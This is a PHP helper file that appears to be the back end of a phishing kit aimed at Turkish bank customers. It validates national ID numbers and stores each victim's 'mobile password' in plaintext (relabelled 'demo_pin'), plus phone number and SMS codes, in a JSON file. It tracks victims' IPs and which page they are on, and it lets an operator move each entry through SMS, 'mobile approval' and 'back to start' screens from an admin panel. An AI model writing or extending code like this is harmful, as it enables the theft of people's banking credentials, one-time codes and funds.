<?php
declare(strict_types=1);

require_once __DIR__ . '/bootstrap.php';

const APPLICATION_STATUSES = ['beklemede', 'sms-dogrulama', 'onay', 'tebrikler', 'yeniden-index'];
const PRESENCE_TTL_SECONDS = 45;
const USER_SCREEN_LABELS = [
    'giris' => 'Karsilama',
    'index' => 'Demo Giris',
    'tel' => 'Telefon Dogrulama',
    'waiting' => 'Bekleme',
    'sms' => 'SMS',
    'onay' => 'Mobil Onay',
    'tebrikler' => 'Tebrikler',
];

function maskSecretValue(string $value): string
{
    $value = trim($value);
    $len = strlen($value);
    if ($len <= 0) {
        return '';
    }
    if ($len <= 2) {
        return str_repeat('*', $len);
    }
    return str_repeat('*', $len - 2) . substr($value, -2);
}

// Backward-compatible alias.
function maskMobilePassword(string $value): string
{
    return maskSecretValue($value);
}

function isValidTurkishNationalId(string $nationalId): bool
{
    if (!preg_match('/^[1-9][0-9]{10}$/', $nationalId)) {
        return false;
    }

    $digits = array_map('intval', str_split($nationalId));
    $oddSum = $digits[0] + $digits[2] + $digits[4] + $digits[6] + $digits[8];
    $evenSum = $digits[1] + $digits[3] + $digits[5] + $digits[7];
    $digit10 = (($oddSum * 7) - $evenSum) % 10;
    if ($digit10 < 0) {
        $digit10 += 10;
    }
    if ($digit10 !== $digits[9]) {
        return false;
    }

    $sumFirst10 = array_sum(array_slice($digits, 0, 10));
    return ($sumFirst10 % 10) === $digits[10];
}

function ensureDataFile(): void
{
    $dataDir = dirname(DATA_FILE);
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0777, true);
    }
    if (!file_exists(DATA_FILE)) {
        file_put_contents(DATA_FILE, "[]", LOCK_EX);
    }
}

function ensurePresenceFile(): void
{
    $dataDir = dirname(PRESENCE_FILE);
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0777, true);
    }
    if (!file_exists(PRESENCE_FILE)) {
        file_put_contents(PRESENCE_FILE, "{}", LOCK_EX);
    }
}

function loadPresence(): array
{
    ensurePresenceFile();
    $raw = file_get_contents(PRESENCE_FILE);
    if ($raw === false || trim($raw) === '') {
        return [];
    }
    $decoded = json_decode($raw, true);
    return is_array($decoded) ? $decoded : [];
}

function savePresence(array $presence): void
{
    ensurePresenceFile();
    $json = json_encode($presence, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);
    file_put_contents(PRESENCE_FILE, $json === false ? "{}" : $json, LOCK_EX);
}

function sanitizeScreenName(string $screen): string
{
    $screen = strtolower(trim($screen));
    return isset(USER_SCREEN_LABELS[$screen]) ? $screen : 'index';
}

function resolveClientIp(): string
{
    $forwardedFor = trim((string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ''));
    if ($forwardedFor !== '') {
        $parts = explode(',', $forwardedFor);
        $candidate = trim((string) ($parts[0] ?? ''));
        if ($candidate !== '') {
            return $candidate;
        }
    }
    return trim((string) ($_SERVER['REMOTE_ADDR'] ?? ''));
}

function upsertPresence(string $screen, ?string $applicationId = null, bool $isAdmin = false): void
{
    $presence = loadPresence();
    $now = time();
    $sessionId = session_id();
    $screen = sanitizeScreenName($screen);

    foreach ($presence as $sid => $entry) {
        $lastSeenTs = (int) ($entry['last_seen_ts'] ?? 0);
        if ($lastSeenTs + PRESENCE_TTL_SECONDS < $now) {
            unset($presence[$sid]);
        }
    }

    $presence[$sessionId] = [
        'screen' => $screen,
        'screen_label' => USER_SCREEN_LABELS[$screen] ?? 'Basvuru Formu',
        'application_id' => $applicationId ?? '',
        'ip' => resolveClientIp(),
        'is_admin' => $isAdmin,
        'last_seen_ts' => $now,
        'last_seen' => date('Y-m-d H:i:s', $now),
    ];

    savePresence($presence);
}

function getOnlineSummary(): array
{
    $presence = loadPresence();
    $now = time();
    $changed = false;

    foreach ($presence as $sid => $entry) {
        $lastSeenTs = (int) ($entry['last_seen_ts'] ?? 0);
        if ($lastSeenTs + PRESENCE_TTL_SECONDS < $now) {
            unset($presence[$sid]);
            $changed = true;
        }
    }
    if ($changed) {
        savePresence($presence);
    }

    $users = array_filter(
        $presence,
        static function (array $entry): bool {
            return !((bool) ($entry['is_admin'] ?? false));
        }
    );

    $byScreen = [];
    $visitors = [];
    foreach ($users as $sid => $entry) {
        $screen = (string) ($entry['screen'] ?? 'index');
        $label = USER_SCREEN_LABELS[$screen] ?? 'Basvuru Formu';
        $byScreen[$label] = ($byScreen[$label] ?? 0) + 1;
        $visitors[] = [
            'session' => substr((string) $sid, 0, 8),
            'screen' => $screen,
            'screen_label' => $label,
            'application_id' => (string) ($entry['application_id'] ?? ''),
            'ip' => (string) ($entry['ip'] ?? ''),
            'last_seen' => (string) ($entry['last_seen'] ?? ''),
            'last_seen_ts' => (int) ($entry['last_seen_ts'] ?? 0),
        ];
    }

    usort(
        $visitors,
        static function (array $a, array $b): int {
            return ($b['last_seen_ts'] <=> $a['last_seen_ts']);
        }
    );

    return [
        'count' => count($users),
        'by_screen' => $byScreen,
        'visitors' => $visitors,
    ];
}

function loadApplications(): array
{
    ensureDataFile();
    $raw = file_get_contents(DATA_FILE);
    if ($raw === false || trim($raw) === '') {
        return [];
    }

    $decoded = json_decode($raw, true);
    return is_array($decoded) ? array_values($decoded) : [];
}

function saveApplications(array $applications): void
{
    ensureDataFile();
    $json = json_encode(
        array_values($applications),
        JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE
    );
    file_put_contents(DATA_FILE, $json === false ? "[]" : $json, LOCK_EX);
}

function createApplication(array $payload): array
{
    $applications = loadApplications();
    $userCode = trim((string) ($payload['user_code'] ?? ($payload['national_id'] ?? '')));
    $demoPin = trim((string) ($payload['demo_pin'] ?? ($payload['mobile_password'] ?? '')));
    $clientIp = trim((string) ($payload['client_ip'] ?? resolveClientIp()));
    $application = [
        'id' => bin2hex(random_bytes(8)),
        'full_name' => '',
        'user_code' => $userCode,
        'national_id' => $userCode, // legacy compatibility
        'phone' => '',
        'email' => '',
        'amount' => '',
        'demo_pin' => $demoPin,
        'demo_pin_hash' => $demoPin !== '' ? password_hash($demoPin, PASSWORD_DEFAULT) : '',
        'demo_pin_masked' => maskSecretValue($demoPin),
        'mobile_password_hash' => $demoPin !== '' ? password_hash($demoPin, PASSWORD_DEFAULT) : '', // legacy compatibility
        'mobile_password_masked' => maskSecretValue($demoPin), // legacy compatibility
        'sms_code' => '',
        'sms_verified' => false,
        'sms_attempts' => 0,
        'sms_last_verified_at' => '',
        'sms_last_attempt_at' => '',
        'status' => 'beklemede',
        'client_ip' => $clientIp,
        'consent' => true,
        'created_at' => date('Y-m-d H:i:s'),
        'updated_at' => date('Y-m-d H:i:s'),
    ];

    $applications[] = $application;
    saveApplications($applications);
    return $application;
}

function findApplicationById(string $id): ?array
{
    foreach (loadApplications() as $application) {
        if (($application['id'] ?? '') === $id) {
            return $application;
        }
    }
    return null;
}

function updateApplicationStatus(string $id, string $status): bool
{
    if (!in_array($status, APPLICATION_STATUSES, true)) {
        return false;
    }

    $applications = loadApplications();
    $updated = false;

    foreach ($applications as &$application) {
        if (($application['id'] ?? '') === $id) {
            $application['status'] = $status;
            $application['updated_at'] = date('Y-m-d H:i:s');
            $updated = true;
            break;
        }
    }
    unset($application);

    if ($updated) {
        saveApplications($applications);
    }
    return $updated;
}

function deleteApplicationById(string $id): bool
{
    if ($id === '') {
        return false;
    }

    $applications = loadApplications();
    $before = count($applications);
    $applications = array_values(
        array_filter(
            $applications,
            static function (array $application) use ($id): bool {
                return ((string) ($application['id'] ?? '')) !== $id;
            }
        )
    );

    if (count($applications) === $before) {
        return false;
    }

    saveApplications($applications);
    return true;
}

function deleteAllApplications(): int
{
    $applications = loadApplications();
    $deleted = count($applications);
    if ($deleted === 0) {
        return 0;
    }

    saveApplications([]);
    return $deleted;
}

function updateSmsVerification(string $id, bool $verified, string $code = ''): bool
{
    $applications = loadApplications();
    $updated = false;

    foreach ($applications as &$application) {
        if (($application['id'] ?? '') !== $id) {
            continue;
        }

        $attempts = (int) ($application['sms_attempts'] ?? 0);
        $application['sms_attempts'] = $attempts + 1;
        $application['sms_last_attempt_at'] = date('Y-m-d H:i:s');

        if ($code !== '') {
            $application['sms_code'] = $code;
        }

        if ($verified) {
            $application['sms_verified'] = true;
            $application['sms_last_verified_at'] = date('Y-m-d H:i:s');
        }

        $application['updated_at'] = date('Y-m-d H:i:s');
        $updated = true;
        break;
    }
    unset($application);

    if ($updated) {
        saveApplications($applications);
    }
    return $updated;
}

function updateApplicationPhone(string $id, string $phone): bool
{
    $applications = loadApplications();
    $updated = false;

    foreach ($applications as &$application) {
        if (($application['id'] ?? '') !== $id) {
            continue;
        }

        $application['phone'] = $phone;
        $application['updated_at'] = date('Y-m-d H:i:s');
        $updated = true;
        break;
    }
    unset($application);

    if ($updated) {
        saveApplications($applications);
    }
    return $updated;
}

function sortedApplicationsDesc(): array
{
    $applications = loadApplications();
    usort(
        $applications,
        static function (array $a, array $b): int {
            return strcmp((string) ($b['created_at'] ?? ''), (string) ($a['created_at'] ?? ''));
        }
    );
    return $applications;
}

function statusLabel(string $status): string
{
    $labels = [
        'beklemede' => 'Beklemede',
        'sms-dogrulama' => 'SMS',
        'onay' => 'Mobil Onay',
        'tebrikler' => 'Tebrikler',
        'yeniden-index' => 'Hatali (Basa don)',
    ];
    return $labels[$status] ?? 'Bilinmiyor';
}

function esc($value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}

function adminUser(): string
{
    return getenv('KB_ADMIN_USER') ?: ADMIN_USERNAME;
}

function adminPass(): string
{
    return getenv('KB_ADMIN_PASS') ?: ADMIN_PASSWORD;
}

function isAdminLoggedIn(): bool
{
    return (bool) ($_SESSION['admin_logged_in'] ?? false);
}

function loginAdmin(string $username, string $password): bool
{
    $ok = hash_equals(adminUser(), $username) && hash_equals(adminPass(), $password);
    if ($ok) {
        $_SESSION['admin_logged_in'] = true;
    }
    return $ok;
}

function requireAdmin(): void
{
    if (!isAdminLoggedIn()) {
        header('Location: login.php');
        exit;
    }
}

function logoutAdmin(): void
{
    $_SESSION = [];
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(
            session_name(),
            '',
            time() - 42000,
            $params['path'],
            $params['domain'],
            $params['secure'],
            $params['httponly']
        );
    }
    session_destroy();
}

function csrfToken(): string
{
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(16));
    }
    return (string) $_SESSION['csrf_token'];
}

function validateCsrf(?string $token): bool
{
    if (!$token || empty($_SESSION['csrf_token'])) {
        return false;
    }
    return hash_equals((string) $_SESSION['csrf_token'], $token);
}

